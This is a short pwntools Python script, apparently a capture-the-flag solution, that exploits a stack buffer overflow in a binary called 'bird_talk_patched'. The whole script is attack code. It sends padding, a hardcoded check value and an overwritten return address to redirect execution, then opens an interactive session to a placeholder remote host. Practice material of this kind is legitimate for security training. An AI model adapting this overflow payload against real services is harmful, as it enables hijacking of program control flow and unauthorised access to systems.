#!/usr/bin/env python3

from pwn import *

exe = ELF("./bird_talk_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEB:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()
    expected = p64(0xa7575b7b33cd13)
    ret_addr = p64(0x00401276)
    r.sendline(b"A"*24 + expected + b"A"*0x28 + ret_addr)
    r.interactive()


if __name__ == "__main__":
    main()
